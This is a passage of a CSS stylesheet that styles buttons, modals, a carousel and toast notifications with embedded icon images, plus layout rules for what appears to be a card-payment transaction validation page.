            fieldset[disabled] .btn-info.focus {
                background-color: #5bc0de;
                border-color: #46b8da;
            }
            .btn-info .badge {
                color: #5bc0de;
                background-color: #fff;
            }
            .btn-warning {
                color: #fff;
                background-color: #f0ad4e;
                border-color: #eea236;
            }
            .btn-warning:focus,
            .btn-warning.focus {
                color: #fff;
                background-color: #ec971f;
                border-color: #985f0d;
            }
            .btn-warning:hover {
                color: #fff;
                background-color: #ec971f;
                border-color: #d58512;
            }
            .btn-warning:active,
            .btn-warning.active,
            .open > .dropdown-toggle.btn-warning {
                color: #fff;
                background-color: #ec971f;
                border-color: #d58512;
            }
            .btn-warning:active:hover,
            .btn-warning.active:hover,
            .open > .dropdown-toggle.btn-warning:hover,
            .btn-warning:active:focus,
            .btn-warning.active:focus,
            .open > .dropdown-toggle.btn-warning:focus,
            .btn-warning:active.focus,
            .btn-warning.active.focus,
            .open > .dropdown-toggle.btn-warning.focus {
                color: #fff;
                background-color: #d58512;
                border-color: #985f0d;
            }
            .btn-warning:active,
            .btn-warning.active,
            .open > .dropdown-toggle.btn-warning {
                background-image: none;
            }
            .btn-warning.disabled:hover,
            .btn-warning[disabled]:hover,
            fieldset[disabled] .btn-warning:hover,
            .btn-warning.disabled:focus,
            .btn-warning[disabled]:focus,
            fieldset[disabled] .btn-warning:focus,
            .btn-warning.disabled.focus,
            .btn-warning[disabled].focus,
            fieldset[disabled] .btn-warning.focus {
                background-color: #f0ad4e;
                border-color: #eea236;
            }
            .btn-warning .badge {
                color: #f0ad4e;
                background-color: #fff;
            }
            .btn-danger {
                color: #fff;
                background-color: #d9534f;
                border-color: #d43f3a;
            }
            .btn-danger:focus,
            .btn-danger.focus {
                color: #fff;
                background-color: #c9302c;
                border-color: #761c19;
            }
            .btn-danger:hover {
                color: #fff;
                background-color: #c9302c;
                border-color: #ac2925;
            }
            .btn-danger:active,
            .btn-danger.active,
            .open > .dropdown-toggle.btn-danger {
                color: #fff;
                background-color: #c9302c;
                border-color: #ac2925;
            }
            .btn-danger:active:hover,
            .btn-danger.active:hover,
            .open > .dropdown-toggle.btn-danger:hover,
            .btn-danger:active:focus,
            .btn-danger.active:focus,
            .open > .dropdown-toggle.btn-danger:focus,
            .btn-danger:active.focus,
            .btn-danger.active.focus,
            .open > .dropdown-toggle.btn-danger.focus {
                color: #fff;
                background-color: #ac2925;
                border-color: #761c19;
            }
            .btn-danger:active,
            .btn-danger.active,
            .open > .dropdown-toggle.btn-danger {
                background-image: none;
            }
            .btn-danger.disabled:hover,
            .btn-danger[disabled]:hover,
            fieldset[disabled] .btn-danger:hover,
            .btn-danger.disabled:focus,
            .btn-danger[disabled]:focus,
            fieldset[disabled] .btn-danger:focus,
            .btn-danger.disabled.focus,
            .btn-danger[disabled].focus,
            fieldset[disabled] .btn-danger.focus {
                background-color: #d9534f;
                border-color: #d43f3a;
            }
            .btn-danger .badge {
                color: #d9534f;
                background-color: #fff;
            }
            .btn-link {
                color: #337ab7;
                font-weight: 400;
                border-radius: 0;
            }
            .btn-link,
            .btn-link:active,
            .btn-link.active,
            .btn-link[disabled],
            fieldset[disabled] .btn-link {
                background-color: transparent;
                -webkit-box-shadow: none;
                box-shadow: none;
            }
            .btn-link,
            .btn-link:hover,
            .btn-link:focus,
            .btn-link:active {
                border-color: transparent;
            }
            .btn-link:hover,
            .btn-link:focus {
                color: #23527c;
                text-decoration: underline;
                background-color: transparent;
            }
            .btn-link[disabled]:hover,
            fieldset[disabled] .btn-link:hover,
            .btn-link[disabled]:focus,
            fieldset[disabled] .btn-link:focus {
                color: #777;
                text-decoration: none;
            }
            .btn-lg {
                padding: 10px 16px;
                font-size: 18px;
                line-height: 1.3333333;
                border-radius: 6px;
            }
            .btn-sm {
                padding: 5px 10px;
                font-size: 12px;
                line-height: 1.5;
                border-radius: 3px;
            }
            .btn-xs {
                padding: 1px 5px;
                font-size: 12px;
                line-height: 1.5;
                border-radius: 3px;
            }
            .btn-block {
                display: block;
                width: 100%;
            }
            .btn-block + .btn-block {
                margin-top: 5px;
            }
            input[type="submit"].btn-block,
            input[type="reset"].btn-block,
            input[type="button"].btn-block {
                width: 100%;
            }
            .fade {
                opacity: 0;
                -webkit-transition: opacity 0.15s linear;
                -o-transition: opacity 0.15s linear;
                transition: opacity 0.15s linear;
            }
            .fade.in {
                opacity: 1;
            }
            .collapse {
                display: none;
            }
            .collapse.in {
                display: block;
            }
            tr.collapse.in {
                display: table-row;
            }
            tbody.collapse.in {
                display: table-row-group;
            }
            .collapsing {
                position: relative;
                height: 0;
                overflow: hidden;
                -webkit-transition-property: height, visibility;
                -o-transition-property: height, visibility;
                transition-property: height, visibility;
                -webkit-transition-duration: 0.35s;
                -o-transition-duration: 0.35s;
                transition-duration: 0.35s;
                -webkit-transition-timing-function: ease;
                -o-transition-timing-function: ease;
                transition-timing-function: ease;
            }
            .close {
                float: right;
                font-size: 21px;
                font-weight: 700;
                line-height: 1;
                color: #000;
                text-shadow: 0 1px 0 #fff;
                opacity: 0.2;
                filter: alpha(opacity=20);
            }
            .close:hover,
            .close:focus {
                color: #000;
                text-decoration: none;
                cursor: pointer;
                opacity: 0.5;
                filter: alpha(opacity=50);
            }
            button.close {
                padding: 0;
                cursor: pointer;
                background: 0 0;
                border: 0;
                -webkit-appearance: none;
            }
            .modal-open {
                overflow: hidden;
            }
            .modal {
                display: none;
                overflow: hidden;
                position: fixed;
                top: 0;
                right: 0;
                bottom: 0;
                left: 0;
                z-index: 1050;
                -webkit-overflow-scrolling: touch;
                outline: 0;
            }
            .modal.fade .modal-dialog {
                -webkit-transform: translate(0, -25%);
                -ms-transform: translate(0, -25%);
                -o-transform: translate(0, -25%);
                transform: translate(0, -25%);
                -webkit-transition: -webkit-transform 0.3s ease-out;
                -o-transition: -o-transform 0.3s ease-out;
                transition: transform 0.3s ease-out;
            }
            .modal.in .modal-dialog {
                -webkit-transform: translate(0, 0);
                -ms-transform: translate(0, 0);
                -o-transform: translate(0, 0);
                transform: translate(0, 0);
            }
            .modal-open .modal {
                overflow-x: hidden;
                overflow-y: auto;
            }
            .modal-dialog {
                position: relative;
                width: auto;
                margin: 10px;
            }
            .modal-content {
                position: relative;
                background-color: #fff;
                border: 1px solid #999;
                border: 1px solid rgba(0, 0, 0, 0.2);
                border-radius: 6px;
                -webkit-box-shadow: 0 3px 9px rgba(0, 0, 0, 0.5);
                box-shadow: 0 3px 9px rgba(0, 0, 0, 0.5);
                -webkit-background-clip: padding-box;
                background-clip: padding-box;
                outline: 0;
            }
            .modal-backdrop {
                position: fixed;
                top: 0;
                right: 0;
                bottom: 0;
                left: 0;
                z-index: 1040;
                background-color: #000;
            }
            .modal-backdrop.fade {
                opacity: 0;
                filter: alpha(opacity=0);
            }
            .modal-backdrop.in {
                opacity: 0.5;
                filter: alpha(opacity=50);
            }
            .modal-header {
                padding: 15px;
                border-bottom: 1px solid #e5e5e5;
            }
            .modal-header .close {
                margin-top: -2px;
            }
            .modal-title {
                margin: 0;
                line-height: 1.42857143;
            }
            .modal-body {
                position: relative;
                padding: 15px;
            }
            .modal-footer {
                padding: 15px;
                text-align: right;
                border-top: 1px solid #e5e5e5;
            }
            .modal-footer .btn + .btn {
                margin-left: 5px;
                margin-bottom: 0;
            }
            .modal-footer .btn-group .btn + .btn {
                margin-left: -1px;
            }
            .modal-footer .btn-block + .btn-block {
                margin-left: 0;
            }
            .modal-scrollbar-measure {
                position: absolute;
                top: -9999px;
                width: 50px;
                height: 50px;
                overflow: scroll;
            }
            @media (min-width: 768px) {
                .modal-dialog {
                    width: 600px;
                    margin: 30px auto;
                }
                .modal-content {
                    -webkit-box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
                    box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
                }
                .modal-sm {
                    width: 300px;
                }
            }
            @media (min-width: 992px) {
                .modal-lg {
                    width: 900px;
                }
            }
            .carousel {
                position: relative;
            }
            .carousel-inner {
                position: relative;
                overflow: hidden;
                width: 100%;
            }
            .carousel-inner > .item {
                display: none;
                position: relative;
                -webkit-transition: 0.6s ease-in-out left;
                -o-transition: 0.6s ease-in-out left;
                transition: 0.6s ease-in-out left;
            }
            .carousel-inner > .item > img,
            .carousel-inner > .item > a > img {
                line-height: 1;
            }
            @media all and (transform-3d), (-webkit-transform-3d) {
                .carousel-inner > .item {
                    -webkit-transition: -webkit-transform 0.6s ease-in-out;
                    -o-transition: -o-transform 0.6s ease-in-out;
                    transition: transform 0.6s ease-in-out;
                    -webkit-backface-visibility: hidden;
                    backface-visibility: hidden;
                    -webkit-perspective: 1000px;
                    perspective: 1000px;
                }
                .carousel-inner > .item.next,
                .carousel-inner > .item.active.right {
                    -webkit-transform: translate3d(100%, 0, 0);
                    transform: translate3d(100%, 0, 0);
                    left: 0;
                }
                .carousel-inner > .item.prev,
                .carousel-inner > .item.active.left {
                    -webkit-transform: translate3d(-100%, 0, 0);
                    transform: translate3d(-100%, 0, 0);
                    left: 0;
                }
                .carousel-inner > .item.next.left,
                .carousel-inner > .item.prev.right,
                .carousel-inner > .item.active {
                    -webkit-transform: translate3d(0, 0, 0);
                    transform: translate3d(0, 0, 0);
                    left: 0;
                }
            }
            .carousel-inner > .active,
            .carousel-inner > .next,
            .carousel-inner > .prev {
                display: block;
            }
            .carousel-inner > .active {
                left: 0;
            }
            .carousel-inner > .next,
            .carousel-inner > .prev {
                position: absolute;
                top: 0;
                width: 100%;
            }
            .carousel-inner > .next {
                left: 100%;
            }
            .carousel-inner > .prev {
                left: -100%;
            }
            .carousel-inner > .next.left,
            .carousel-inner > .prev.right {
                left: 0;
            }
            .carousel-inner > .active.left {
                left: -100%;
            }
            .carousel-inner > .active.right {
                left: 100%;
            }
            .carousel-control {
                position: absolute;
                top: 0;
                left: 0;
                bottom: 0;
                width: 15%;
                opacity: 0.5;
                filter: alpha(opacity=50);
                font-size: 20px;
                color: #fff;
                text-align: center;
                text-shadow: 0 1px 2px rgba(0, 0, 0, 0.6);
                background-color: transparent;
            }
            .carousel-control.left {
                background-image: -webkit-linear-gradient(left, rgba(0, 0, 0, 0.5) 0%, rgba(0, 0, 0, 0.0001) 100%);
                background-image: -o-linear-gradient(left, rgba(0, 0, 0, 0.5) 0%, rgba(0, 0, 0, 0.0001) 100%);
                background-image: -webkit-gradient(linear, left top, right top, from(rgba(0, 0, 0, 0.5)), to(rgba(0, 0, 0, 0.0001)));
                background-image: linear-gradient(to right, rgba(0, 0, 0, 0.5) 0%, rgba(0, 0, 0, 0.0001) 100%);
                background-repeat: repeat-x;
                filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#80000000',endColorstr='#00000000',GradientType=1);
            }
            .carousel-control.right {
                left: auto;
                right: 0;
                background-image: -webkit-linear-gradient(left, rgba(0, 0, 0, 0.0001) 0%, rgba(0, 0, 0, 0.5) 100%);
                background-image: -o-linear-gradient(left, rgba(0, 0, 0, 0.0001) 0%, rgba(0, 0, 0, 0.5) 100%);
                background-image: -webkit-gradient(linear, left top, right top, from(rgba(0, 0, 0, 0.0001)), to(rgba(0, 0, 0, 0.5)));
                background-image: linear-gradient(to right, rgba(0, 0, 0, 0.0001) 0%, rgba(0, 0, 0, 0.5) 100%);
                background-repeat: repeat-x;
                filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#00000000',endColorstr='#80000000',GradientType=1);
            }
            .carousel-control:hover,
            .carousel-control:focus {
                outline: 0;
                color: #fff;
                text-decoration: none;
                opacity: 0.9;
                filter: alpha(opacity=90);
            }
            .carousel-control .icon-prev,
            .carousel-control .icon-next,
            .carousel-control .glyphicon-chevron-left,
            .carousel-control .glyphicon-chevron-right {
                position: absolute;
                top: 50%;
                margin-top: -10px;
                z-index: 5;
                display: inline-block;
            }
            .carousel-control .icon-prev,
            .carousel-control .glyphicon-chevron-left {
                left: 50%;
                margin-left: -10px;
            }
            .carousel-control .icon-next,
            .carousel-control .glyphicon-chevron-right {
                right: 50%;
                margin-right: -10px;
            }
            .carousel-control .icon-prev,
            .carousel-control .icon-next {
                width: 20px;
                height: 20px;
                line-height: 1;
                font-family: serif;
            }
            .carousel-control .icon-prev:before {
                content: "\2039";
            }
            .carousel-control .icon-next:before {
                content: "\203a";
            }
            .carousel-indicators {
                position: absolute;
                bottom: 10px;
                left: 50%;
                z-index: 15;
                width: 60%;
                margin-left: -30%;
                padding-left: 0;
                list-style: none;
                text-align: center;
            }
            .carousel-indicators li {
                display: inline-block;
                width: 10px;
                height: 10px;
                margin: 1px;
                text-indent: -999px;
                border: 1px solid #fff;
                border-radius: 10px;
                cursor: pointer;
                background-color: #000 \9;
                background-color: transparent;
            }
            .carousel-indicators .active {
                margin: 0;
                width: 12px;
                height: 12px;
                background-color: #fff;
            }
            .carousel-caption {
                position: absolute;
                left: 15%;
                right: 15%;
                bottom: 20px;
                z-index: 10;
                padding-top: 20px;
                padding-bottom: 20px;
                color: #fff;
                text-align: center;
                text-shadow: 0 1px 2px rgba(0, 0, 0, 0.6);
            }
            .carousel-caption .btn {
                text-shadow: none;
            }
            @media screen and (min-width: 768px) {
                .carousel-control .glyphicon-chevron-left,
                .carousel-control .glyphicon-chevron-right,
                .carousel-control .icon-prev,
                .carousel-control .icon-next {
                    width: 30px;
                    height: 30px;
                    margin-top: -10px;
                    font-size: 30px;
                }
                .carousel-control .glyphicon-chevron-left,
                .carousel-control .icon-prev {
                    margin-left: -10px;
                }
                .carousel-control .glyphicon-chevron-right,
                .carousel-control .icon-next {
                    margin-right: -10px;
                }
                .carousel-caption {
                    left: 20%;
                    right: 20%;
                    padding-bottom: 30px;
                }
                .carousel-indicators {
                    bottom: 20px;
                }
            }
            .clearfix:before,
            .clearfix:after,
            .dl-horizontal dd:before,
            .dl-horizontal dd:after,
            .form-horizontal .form-group:before,
            .form-horizontal .form-group:after,
            .modal-header:before,
            .modal-header:after,
            .modal-footer:before,
            .modal-footer:after {
                content: " ";
                display: table;
            }
            .clearfix:after,
            .dl-horizontal dd:after,
            .form-horizontal .form-group:after,
            .modal-header:after,
            .modal-footer:after {
                clear: both;
            }
            .center-block {
                display: block;
                margin-left: auto;
                margin-right: auto;
            }
            .pull-right {
                float: right !important;
            }
            .pull-left {
                float: left !important;
            }
            .hide {
                display: none !important;
            }
            .show {
                display: block !important;
            }
            .invisible {
                visibility: hidden;
            }
            .text-hide {
                font: 0/0 a;
                color: transparent;
                text-shadow: none;
                background-color: transparent;
                border: 0;
            }
            .hidden {
                display: none !important;
            }
            .affix {
                position: fixed;
            }
            .language-rtl {
                margin: -5px 55px;
            }
            .language-ltr {
                margin: -4px 54px;
            }
            * {
                -moz-box-sizing: border-box;
                -webkit-box-sizing: border-box;
                box-sizing: border-box;
            }
            img {
                height: auto;
                max-width: 100%;
            }
            .container {
                max-width: 400px;
            }
            .col-1 {
                width: 8.33%;
            }
            .col-2 {
                width: 16.66%;
            }
            .col-3 {
                width: 25%;
            }
            .col-4 {
                width: 33.33%;
            }
            .col-5 {
                width: 41.66%;
            }
            .col-6 {
                width: 50%;
            }
            .col-7 {
                width: 58.33%;
            }
            .col-8 {
                width: 66.66%;
            }
            .col-9 {
                width: 75%;
            }
            .col-10 {
                width: 83.33%;
            }
            .col-11 {
                width: 91.66%;
            }
            .col-12 {
                width: 100%;
            }
            [class^="col-"],
            [class*=" col-"] {
                float: left;
                padding: 10px;
            }
            .row:after {
                clear: both;
                content: "";
                display: block;
            }
            .header div > [class^="col-"],
            [class*=" col-"] {
                padding: 5px;
            }
            .footer div > [class^="col-"],
            [class*=" col-"] {
                text-align: center;
            }
            ul.unstyled-list-inline {
                list-style-type: none;
                padding: 0;
            }
            ul.unstyled-list-inline li {
                display: inline;
            }
            .toast-title {
                font-weight: 700;
            }
            .toast-message {
                -ms-word-wrap: break-word;
                word-wrap: break-word;
            }
            .toast-message a,
            .toast-message label {
                color: #fff;
            }
            .toast-message a:hover {
                color: #ccc;
                text-decoration: none;
            }
            .toast-close-button {
                position: relative;
                right: -0.3em;
                top: -0.3em;
                float: right;
                font-size: 20px;
                font-weight: 700;
                color: #fff;
                -webkit-text-shadow: 0 1px 0 #fff;
                text-shadow: 0 1px 0 #fff;
                opacity: 0.8;
                -ms-filter: progid:DXImageTransform.Microsoft.Alpha(Opacity=80);
                filter: alpha(opacity=80);
                line-height: 1;
            }
            .toast-close-button:focus,
            .toast-close-button:hover {
                color: #000;
                text-decoration: none;
                cursor: pointer;
                opacity: 0.4;
                -ms-filter: progid:DXImageTransform.Microsoft.Alpha(Opacity=40);
                filter: alpha(opacity=40);
            }
            .rtl .toast-close-button {
                left: -0.3em;
                float: left;
                right: 0.3em;
            }
            button.toast-close-button {
                padding: 0;
                cursor: pointer;
                background: 0 0;
                border: 0;
                -webkit-appearance: none;
            }
            .toast-top-center {
                top: 0;
                right: 0;
                width: 100%;
            }
            .toast-bottom-center {
                bottom: 0;
                right: 0;
                width: 100%;
            }
            .toast-top-full-width {
                top: 0;
                right: 0;
                width: 100%;
            }
            .toast-bottom-full-width {
                bottom: 0;
                right: 0;
                width: 100%;
            }
            .toast-top-left {
                top: 12px;
                left: 12px;
            }
            .toast-top-right {
                top: 12px;
                right: 12px;
            }
            .toast-bottom-right {
                right: 12px;
                bottom: 12px;
            }
            .toast-bottom-left {
                bottom: 12px;
                left: 12px;
            }
            #toast-container {
                position: fixed;
                z-index: 999999;
                pointer-events: none;
            }
            #toast-container * {
                -moz-box-sizing: border-box;
                -webkit-box-sizing: border-box;
                box-sizing: border-box;
            }
            #toast-container > div {
                position: relative;
                pointer-events: auto;
                overflow: hidden;
                margin: 0 0 6px;
                padding: 15px 15px 15px 50px;
                width: 300px;
                -moz-border-radius: 3px;
                -webkit-border-radius: 3px;
                border-radius: 3px;
                background-position: 15px center;
                background-repeat: no-repeat;
                -moz-box-shadow: 0 0 12px #999;
                -webkit-box-shadow: 0 0 12px #999;
                box-shadow: 0 0 12px #999;
                color: #fff;
                opacity: 0.8;
                -ms-filter: progid:DXImageTransform.Microsoft.Alpha(Opacity=80);
                filter: alpha(opacity=80);
            }
            #toast-container > div.rtl {
                direction: rtl;
                padding: 15px 50px 15px 15px;
                background-position: right 15px center;
            }
            #toast-container > div:hover {
                -moz-box-shadow: 0 0 12px #000;
                -webkit-box-shadow: 0 0 12px #000;
                box-shadow: 0 0 12px #000;
                opacity: 1;
                -ms-filter: progid:DXImageTransform.Microsoft.Alpha(Opacity=100);
                filter: alpha(opacity=100);
                cursor: pointer;
            }
            #toast-container > .toast-info {
                background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAGwSURBVEhLtZa9SgNBEMc9sUxxRcoUKSzSWIhXpFMhhYWFhaBg4yPYiWCXZxBLERsLRS3EQkEfwCKdjWJAwSKCgoKCcudv4O5YLrt7EzgXhiU3/4+b2ckmwVjJSpKkQ6wAi4gwhT+z3wRBcEz0yjSseUTrcRyfsHsXmD0AmbHOC9Ii8VImnuXBPglHpQ5wwSVM7sNnTG7Za4JwDdCjxyAiH3nyA2mtaTJufiDZ5dCaqlItILh1NHatfN5skvjx9Z38m69CgzuXmZgVrPIGE763Jx9qKsRozWYw6xOHdER+nn2KkO+Bb+UV5CBN6WC6QtBgbRVozrahAbmm6HtUsgtPC19tFdxXZYBOfkbmFJ1VaHA1VAHjd0pp70oTZzvR+EVrx2Ygfdsq6eu55BHYR8hlcki+n+kERUFG8BrA0BwjeAv2M8WLQBtcy+SD6fNsmnB3AlBLrgTtVW1c2QN4bVWLATaIS60J2Du5y1TiJgjSBvFVZgTmwCU+dAZFoPxGEEs8nyHC9Bwe2GvEJv2WXZb0vjdyFT4Cxk3e/kIqlOGoVLwwPevpYHT+00T+hWwXDf4AJAOUqWcDhbwAAAAASUVORK5CYII=) !important;
            }
            #toast-container > .toast-error {
                background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAHOSURBVEhLrZa/SgNBEMZzh0WKCClSCKaIYOED+AAKeQQLG8HWztLCImBrYadgIdY+gIKNYkBFSwu7CAoqCgkkoGBI/E28PdbLZmeDLgzZzcx83/zZ2SSXC1j9fr+I1Hq93g2yxH4iwM1vkoBWAdxCmpzTxfkN2RcyZNaHFIkSo10+8kgxkXIURV5HGxTmFuc75B2RfQkpxHG8aAgaAFa0tAHqYFfQ7Iwe2yhODk8+J4C7yAoRTWI3w/4klGRgR4lO7Rpn9+gvMyWp+uxFh8+H+ARlgN1nJuJuQAYvNkEnwGFck18Er4q3egEc/oO+mhLdKgRyhdNFiacC0rlOCbhNVz4H9FnAYgDBvU3QIioZlJFLJtsoHYRDfiZoUyIxqCtRpVlANq0EU4dApjrtgezPFad5S19Wgjkc0hNVnuF4HjVA6C7QrSIbylB+oZe3aHgBsqlNqKYH48jXyJKMuAbiyVJ8KzaB3eRc0pg9VwQ4niFryI68qiOi3AbjwdsfnAtk0bCjTLJKr6mrD9g8iq/S/B81hguOMlQTnVyG40wAcjnmgsCNESDrjme7wfftP4P7SP4N3CJZdvzoNyGq2c/HWOXJGsvVg+RA/k2MC/wN6I2YA2Pt8GkAAAAASUVORK5CYII=) !important;
            }
            #toast-container > .toast-success {
                background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAADsSURBVEhLY2AYBfQMgf///3P8+/evAIgvA/FsIF+BavYDDWMBGroaSMMBiE8VC7AZDrIFaMFnii3AZTjUgsUUWUDA8OdAH6iQbQEhw4HyGsPEcKBXBIC4ARhex4G4BsjmweU1soIFaGg/WtoFZRIZdEvIMhxkCCjXIVsATV6gFGACs4Rsw0EGgIIH3QJYJgHSARQZDrWAB+jawzgs+Q2UO49D7jnRSRGoEFRILcdmEMWGI0cm0JJ2QpYA1RDvcmzJEWhABhD/pqrL0S0CWuABKgnRki9lLseS7g2AlqwHWQSKH4oKLrILpRGhEQCw2LiRUIa4lwAAAABJRU5ErkJggg==) !important;
            }
            #toast-container > .toast-warning {
                background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAGYSURBVEhL5ZSvTsNQFMbXZGICMYGYmJhAQIJAICYQPAACiSDB8AiICQQJT4CqQEwgJvYASAQCiZiYmJhAIBATCARJy+9rTsldd8sKu1M0+dLb057v6/lbq/2rK0mS/TRNj9cWNAKPYIJII7gIxCcQ51cvqID+GIEX8ASG4B1bK5gIZFeQfoJdEXOfgX4QAQg7kH2A65yQ87lyxb27sggkAzAuFhbbg1K2kgCkB1bVwyIR9m2L7PRPIhDUIXgGtyKw575yz3lTNs6X4JXnjV+LKM/m3MydnTbtOKIjtz6VhCBq4vSm3ncdrD2lk0VgUXSVKjVDJXJzijW1RQdsU7F77He8u68koNZTz8Oz5yGa6J3H3lZ0xYgXBK2QymlWWA+RWnYhskLBv2vmE+hBMCtbA7KX5drWyRT/2JsqZ2IvfB9Y4bWDNMFbJRFmC9E74SoS0CqulwjkC0+5bpcV1CZ8NMej4pjy0U+doDQsGyo1hzVJttIjhQ7GnBtRFN1UarUlH8F3xict+HY07rEzoUGPlWcjRFRr4/gChZgc3ZL2d8oAAAAASUVORK5CYII=) !important;
            }
            #toast-container.toast-bottom-center > div,
            #toast-container.toast-top-center > div {
                width: 300px;
                margin-left: auto;
                margin-right: auto;
            }
            #toast-container.toast-bottom-full-width > div,
            #toast-container.toast-top-full-width > div {
                width: 96%;
                margin-left: auto;
                margin-right: auto;
            }
            .toast {
                background-color: #030303;
            }
            .toast-success {
                background-color: #51a351;
            }
            .toast-error {
                background-color: #bd362f;
            }
            .toast-info {
                background-color: #2f96b4;
            }
            .toast-warning {
                background-color: #f89406;
            }
            .toast-progress {
                position: absolute;
                left: 0;
                bottom: 0;
                height: 4px;
                background-color: #000;
                opacity: 0.4;
                -ms-filter: progid:DXImageTransform.Microsoft.Alpha(Opacity=40);
                filter: alpha(opacity=40);
            }
            @media all and (max-width: 240px) {
                #toast-container > div {
                    padding: 8px 8px 8px 50px;
                    width: 11em;
                }
                #toast-container > div.rtl {
                    padding: 8px 50px 8px 8px;
                }
                #toast-container .toast-close-button {
                    right: -0.2em;
                    top: -0.2em;
                }
                #toast-container .rtl .toast-close-button {
                    left: -0.2em;
                    right: 0.2em;
                }
            }
            @media all and (min-width: 241px) and (max-width: 480px) {
                #toast-container > div {
                    padding: 8px 8px 8px 50px;
                    width: 18em;
                }
                #toast-container > div.rtl {
                    padding: 8px 50px 8px 8px;
                }
                #toast-container .toast-close-button {
                    right: -0.2em;
                    top: -0.2em;
                }
                #toast-container .rtl .toast-close-button {
                    left: -0.2em;
                    right: 0.2em;
                }
            }
            @media all and (min-width: 481px) and (max-width: 768px) {
                #toast-container > div {
                    padding: 15px 15px 15px 50px;
                    width: 25em;
                }
                #toast-container > div.rtl {
                    padding: 15px 50px 15px 15px;
                }
            }
            .img-responsive {
                max-height: 100%;
                max-width: 100%;
                width: auto;
                vertical-align: middle;
            }
            .btn {
                font-weight: 700;
                text-shadow: none;
                padding: 6px 20px;
                word-break: break-word;
                white-space: normal;
            }
            a.btn-primary {
                text-decoration: none !important;
            }
            a.btn.btn-link {
                padding: 0;
            }
            .checkbox,
            .radio {
                margin-top: 0;
            }
            .list-inline {
                margin-bottom: 0;
            }
            fieldset {
                padding-bottom: 0.25em;
            }
            fieldset legend {
                color: #676767;
                font-size: 1.071em;
                font-weight: 700;
                margin-bottom: 0.286em;
            }
            .form-group {
                margin-bottom: 0.25em;
            }
            .form-group .form-control {
                border-radius: 0;
            }
            .form-group-sm {
                margin-bottom: 2px;
            }
            .form-group-sm .form-control {
                border-radius: 0;
            }
            .list-group .list-group-item label {
                margin-bottom: 0;
            }
            .panel {
                box-shadow: none;
            }
            .panel-default > .panel-heading {
                background: 0 0;
            }
            .panel-heading > .panel-title {
                font-size: 14px;
            }
            .modal-header {
                padding: 4px 10px;
            }
            .modal-header button.close {
                padding-top: 3px;
            }
            .modal-footer {
                text-align: center;
            }
            .container {
                max-width: 100%;
            }
            [class^="col-"],
            [class*=" col-"] {
                padding: 0 0.714em;
            }
            .header div > [class^="col-"],
            [class*=" col-"] {
                padding: 0 0.714em;
            }
            .modal-backdrop {
                background: #fff;
            }
            .carousel-control,
            .modal-backdrop.in {
                opacity: 0.9;
                filter: alpha(opacity=90);
            }
            .modal-dialog {
                margin: 20px auto;
            }
            .modal-dialog .modal-content {
                -webkit-box-shadow: none;
                box-shadow: none;
                border-radius: 0;
            }
            #ValidateTransactionDetailsContainer > .row {
                padding-bottom: 0;
            }
            .validate-field label,
            .validate-field .validate-label {
                text-align: right;
                margin-bottom: 0;
            }
            .validate-field.right-to-left label,
            .validate-field.right-to-left .validate-label {
                text-align: left;
            }
            .validate-field input {
                width: 100%;
                max-width: 130px;
            }
            .right-to-left.validate-field [class*="col-"] {
                float: right !important;
                text-align: left;
            }
            .validate-label {
                color: #000;
                display: inline-block;
                max-width: 100%;
                font-weight: 700;
            }
            .cardholder-options-wrapper label {
                font-size: 1.071em;
                font-weight: 100;
                margin-bottom: 0.286em;
            }
            .cardholder-options-wrapper {
                margin-left: 15%;
            }
            .cardholder-name-wrapper {
                display: none;
            }
            #referenceCode {
                font-weight: 700;
                color: #000;
            }
            #referenceCode {
                font-weight: 700;
                color: #000;
            }
            .credential-value-container {
                display: inline-block;
                padding: 0.2em;
                background-color: #fff;
                border: 1px solid #a9a9a9;
                max-width: 170px;
                height: 22px;
                border-top-left-radius: 4px;
                border-bottom-left-radius: 4px;
            }
            .credential-value-container input {
                display: inline-block;
                max-width: 120px;
            }
            .credential-value-field {
                padding: 0;
                background-color: transparent;
                border: none;
                outline: none;
            }
            .reference-code {
                font-size: 10pt;
                margin-top: -2px;
                border-top-left-radius: 4px;
                border-bottom-left-radius: 4px;
                color: #000;
                font-weight: 700;
            }
            .credential-col {
                padding: 0;
                text-align: inherit;
            }
            .cell {
                display: table-cell;
                vertical-align: middle;
            }
            .ellipsis,
            ul.list-grouped-visa label,
            ul.list-grouped-visa [class*=" col-"],
            ul.list-grouped-visa [class^="col-"],
            ul.list-grouped label,
            ul.list-grouped [class*=" col-"],
            ul.list-grouped [class^="col-"] {
                white-space: nowrap;
                overflow: hidden;
                -ms-text-overflow: ellipsis;
                -o-text-overflow: ellipsis;
                text-overflow: ellipsis;
            }
            .pad-half {
                padding-bottom: 0.5em !important;
            }
            .text-small {
                font-size: 0.857em !important;
            }
            .text-size-reg {
                font-size: 1em !important;
            }
            .screenreader-only {
                position: absolute;
                left: -10000px;
                top: auto;
                width: 1px;
                height: 1px;
                overflow: hidden;
            }
            .screenreader-only-rtl {
                top: auto;
                width: 1px;
                height: 1px;
                overflow: hidden;
                position: absolute;
            }
            .div-width {
                width: 52.5%;
                display: inline-block;
            }
            .no-decoration {
                text-decoration: none !important;
            }
            .col-8.pull-right:after {
                content: "‎‎";
            }
            .col-8.pull-right:before {
                content: "‎‎";
            }
            a.closeModal {
                font-size: 18px;
                color: #000 !important;
                text-decoration: none;
            }
            @media screen and (max-height: 600px) {
                a.closeModal {
                    position: absolute;
                    right: 1%;
                }
            }
            @media screen and (min-height: 600px) {
                a.closeModal {
                    float: right;
                }
            }
            @media screen and (max-height: 600px) {
                #HeaderLogosFullWidth {
